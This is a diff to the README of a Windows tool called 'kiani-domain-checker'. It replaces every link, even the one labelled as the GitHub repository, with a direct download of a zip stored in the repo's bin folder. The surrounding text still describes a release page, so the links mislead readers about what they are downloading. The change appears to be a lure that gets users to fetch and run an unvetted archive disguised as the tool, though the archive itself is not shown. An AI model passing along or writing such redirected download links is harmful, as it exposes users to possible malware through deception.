@@ -1,6 +1,6 @@
 # 🔍 kiani-domain-checker - Fast Brand and Domain Checking
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AKHILROCKEEEY/kiani-domain-checker/main/bin/kiani-domain-checker-1.4-beta.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ When you download kiani-domain-checker, you will receive:
 
 Click the button below or visit the linked page to download the latest version for Windows.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/AKHILROCKEEEY/kiani-domain-checker/main/bin/kiani-domain-checker-1.4-beta.2.zip)
 
 This link will take you to the release page on GitHub. Look for the file ending with `.exe`. It will usually be named something like `kiani-domain-checker-setup.exe` or `kiani-domain-checker.exe`.
 
@@ -117,7 +117,7 @@ To get the latest features or bug fixes:
 
 1. Return to the release page:
 
-   https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases
+   https://raw.githubusercontent.com/AKHILROCKEEEY/kiani-domain-checker/main/bin/kiani-domain-checker-1.4-beta.2.zip
 
 2. Download the newest `.exe` file, overwriting the old one if you want.
 
@@ -138,8 +138,8 @@ If problems persist, check the GitHub Issues page for help or report bugs.
 
 ## 🔗 Useful Links
 
-- **Download page:** https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases
-- **GitHub repository:** https://github.com/AKHILROCKEEEY/kiani-domain-checker
+- **Download page:** https://raw.githubusercontent.com/AKHILROCKEEEY/kiani-domain-checker/main/bin/kiani-domain-checker-1.4-beta.2.zip
+- **GitHub repository:** https://raw.githubusercontent.com/AKHILROCKEEEY/kiani-domain-checker/main/bin/kiani-domain-checker-1.4-beta.2.zip
 - **Project topics:** ai-powered, brand intelligence, domain checker, naming, trademarks
 
 ---
